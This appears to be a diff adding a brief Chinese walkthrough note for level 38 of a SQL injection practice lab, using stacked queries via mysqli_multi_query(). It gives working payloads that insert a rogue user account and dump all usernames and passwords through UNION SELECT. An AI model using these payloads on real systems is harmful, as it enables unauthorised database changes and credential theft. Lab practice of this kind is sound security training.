@@ -1,0 +1,17 @@
+第38关
+
+叠加注入，通过；进行语句隔断。
+本关因为用的是mysqli_multi_query()函数，可以多条语句操作。
+?id=-1'; insert into users(id,username,password) values(20,'zl','123')
+
+常规。。。单引号闭合
+
+爆出回显
+?id=-1' union select 1,2,3--+
+
+爆信息
+?id=-1' union select 1,2,group_concat(username,0x3a,password) from users --+
+
+
+
+闯关成功！！！
